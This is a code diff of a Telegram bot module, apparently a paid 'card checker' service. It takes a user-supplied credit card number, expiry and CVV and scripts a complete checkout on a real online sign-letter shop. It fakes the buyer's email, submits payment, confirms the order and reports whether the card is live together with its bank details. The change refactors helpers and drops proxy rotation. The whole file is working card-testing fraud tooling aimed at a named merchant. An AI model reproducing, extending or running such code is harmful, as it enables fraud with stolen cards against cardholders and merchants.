@@ -12,12 +12,20 @@ from pyrogram.enums import ParseMode
 from src.extras.checklib import MakeGate, ScrapInfo
 
 
-BIN_API = "https://bins.antipublic.cc/bins/"
+name_gate = "Payflow_Charged"
+subtype = "$60.00 Charged"
+command = "pc"
 
 
-@Client.on_message(filters.command(["payflow_charge", "pc"], ["/", ",", ".", ";", "-"]))
-async def jaico(client: Client, m: Message):
-    card = m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
+@Client.on_message(
+    filters.command(
+        [f"{name_gate}", f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False
+    )
+)
+async def gateway(client: Client, m: Message):
+    card = (
+        m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
+    )
     user_id = m.from_user.id
     with Database() as db:
         if not db.IsPremium(user_id):
@@ -31,55 +39,34 @@ async def jaico(client: Client, m: Message):
             f"Please wait <code>{antispam_result}'s</code>", quote=True
         )
     await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
-    msg = await m.reply("checking...", quote=True)
+    card_splited = MakeGate(card).get_card_details()
+    msgg = f"""<b>Checking... 🌩️</b>
+━━━━━━━━━━━
+<b>CC:</b> {card_splited[0]}:{card_splited[1]}:{card_splited[2]}:{card_splited[3]}
+<b>Status:</b> Loading..."""
+    msg = await m.reply(msgg, quote=True)
     cc_check = await get_live(card, msg)
-
-def load_proxies(filename):
-    with open(filename, 'r') as file:
-        proxies = [{'http': line.strip()} for line in file if line.strip()]
-    return proxies
-
-def getIndex(response):
-    with open("index.html", "w", encoding="utf-8") as f:
-        f.write(response.text)
-
-def getStr(text:str, a:str, b:str) -> str:
-    return text.split(a)[1].split(b)[0]
-
-def email_generator():
-    dominio = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'example.com']
-    longitud = random.randint(8, 12)
-    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
-    correo = usuario + '@' + random.choice(dominio)
-    return correo
-
-def open_files(file):
-    with open(file, 'r') as f: return [line.strip() for line in f]
 
 
 async def get_live(card, msg):
-    card_splited = makeGate.split_card(card)
-    ccn = card_splited[0]
-    month = card_splited[1]
-    year = card_splited[2]
-    cvv = card_splited[3]
+    card_split = MakeGate(card).get_card_details()
+    ccn = card_split[0]
+    month = card_split[1]
+    year = card_split[2]
+    if len(year) == 2:
+        year = f"20{card_split[2]}"
+    cvv = card_split[3]
+    card_type = card_split[4]
 
-    if ccn[0] == '4':
-        card_type = "Visa"
-    elif ccn[0] == '5':
-        card_type = 'MasterCard'
-    elif ccn[0] == '3':
-        card_type = "Amex"
+    email = ScrapInfo().email_generator()
 
-    session = r.Session()
-    proxies = load_proxies("src/extras/proxies.txt")
-    proxy = random.choice(proxies)
+    initial_time = time.time()
+    data_bin = MakeGate(card).bin_lookup()
+    session = ScrapInfo().session()
 
 # ========= Getting the first site ===============
 
     try:
-
-        initial_time = time.time()
 
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -91,15 +78,20 @@ async def get_live(card, msg):
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
 }
 
-        response = session.get('https://www.buysignletters.com/en/aluminum-letters-numbers', headers=headers, proxies=proxy)
+        response = session.get('https://www.buysignletters.com/en/aluminum-letters-numbers', headers=headers)
 
         current_time = datetime.now().strftime("%D - %H:%M:%S")
 
-        msgg = f"""<b>{current_time}</b>
+        msgg = f"""<b>{current_time} 🌩️</b>
 ━━━━━━━━━━━
 <b>CC:</b> {ccn}:{month}:{year}:{cvv}
 <b>Status:</b> Checking...
-"""
+━━━━━━━━━━━
+<code>| Bank Information</code>
+━━━━━━━━━━━
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>"""
 
         await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
 
@@ -133,8 +125,7 @@ async def get_live(card, msg):
             'https://www.buysignletters.com/addproducttocart/details/163105/1',
             params=params,
             headers=headers,
-            data=data,
-            proxies=proxy
+            data=data
 )
 
         #await msg.edit_text("2", parse_mode=ParseMode.MARKDOWN)
@@ -149,7 +140,7 @@ async def get_live(card, msg):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
 }
-        response = session.get('https://www.buysignletters.com/cart', headers=headers, proxies=proxy)
+        response = session.get('https://www.buysignletters.com/cart', headers=headers)
 
 # ============ Fourth req ===========
 
@@ -179,7 +170,7 @@ async def get_live(card, msg):
             'ZipPostalCode': (None, ''),
 }
 
-        response = session.post('https://www.buysignletters.com/en/cart', headers=headers, files=files, proxies=proxy)
+        response = session.post('https://www.buysignletters.com/en/cart', headers=headers, files=files)
 
         #await msg.edit_text("3", parse_mode=ParseMode.MARKDOWN)
 
@@ -194,7 +185,7 @@ async def get_live(card, msg):
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
 }
 
-        response = session.get('https://www.buysignletters.com/en/checkout', headers=headers, proxies=proxy)
+        response = session.get('https://www.buysignletters.com/en/checkout', headers=headers)
 
         #await msg.edit_text("4", parse_mode=ParseMode.MARKDOWN)
 
@@ -219,13 +210,10 @@ async def get_live(card, msg):
             'https://www.buysignletters.com/checkout/GetShippingMethodInfo/',
             headers=headers,
             data=data,
-            proxies=proxy
 )
 
         #await msg.edit_text("5", parse_mode=ParseMode.MARKDOWN)
 
-
-        email = email_generator()
 
         headers = {
             'accept': '*/*',
@@ -254,7 +242,7 @@ async def get_live(card, msg):
             'ship_to_same_address': 'on',
 }
 
-        response = session.post('https://www.buysignletters.com/checkout/OneSaveBilling/', headers=headers, data=data, proxies=proxy)
+        response = session.post('https://www.buysignletters.com/checkout/OneSaveBilling/', headers=headers, data=data)
 
         #await msg.edit_text("6", parse_mode=ParseMode.MARKDOWN)
 
@@ -275,8 +263,7 @@ async def get_live(card, msg):
         response = session.post(
             'https://www.buysignletters.com/checkout/OneSaveShippingMethod/',
             headers=headers,
-            data=data,
-            proxies=proxy
+            data=data
 )
 
 
@@ -298,8 +285,7 @@ async def get_live(card, msg):
         response = session.post(
             'https://www.buysignletters.com/checkout/OneSavePaymentMethod/',
             headers=headers,
-            data=data,
-            proxies=proxy
+            data=data
 )
 
         #await msg.edit_text("7", parse_mode=ParseMode.MARKDOWN)
@@ -327,8 +313,7 @@ async def get_live(card, msg):
         response = session.post(
             'https://www.buysignletters.com/checkout/OneSavePaymentInfo/',
             headers=headers,
-            data=data,
-            proxies=proxy
+            data=data
 )
 
 
@@ -350,10 +335,8 @@ async def get_live(card, msg):
             'Comment': '',
 }
 
-        response = session.post('https://www.buysignletters.com/checkout/OneConfirmOrder/', headers=headers, data=data, proxies=proxy)
-        card_response = getStr(response.text, 'Response Description :', "u003c/li").replace("\\", '')
-        BIN = ccn[0:6]
-        data = r.get(BIN_API+BIN).json()
+        response = session.post('https://www.buysignletters.com/checkout/OneConfirmOrder/', headers=headers, data=data)
+        card_response = ScrapInfo().getStr(response.text, 'Response Description :', "u003c/li").replace("\\", '')
         final_time = time.time() - initial_time
 
         if "CVV2" in card_response:
@@ -366,9 +349,9 @@ async def get_live(card, msg):
 ━━━━━━━━━━━
 <code>| Bank Information</code>
 ━━━━━━━━━━━
-<a href="https://t.me/ByDog3r">⊁</a> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
-<a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
-<a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>
 <a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}""" # to check proxy add <a href="https://t.me/ByDog3r">⊁</a> <b>Proxy</b> :{proxy['http']} ✅
         else:
             mssg = f"""<b>#Payflow_Charged ($pc) 🌩️</b>
@@ -380,9 +363,9 @@ async def get_live(card, msg):
 ━━━━━━━━━━━
 <code>| Bank Information</code>
 ━━━━━━━━━━━
-<a href="https://t.me/ByDog3r">⊁</a> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
-<a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
-<a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>
 <a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}""" # to check proxy add <a href="https://t.me/ByDog3r">⊁</a> <b>Proxy</b> :{proxy['http']} ✅
 
         await msg.edit_text(mssg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
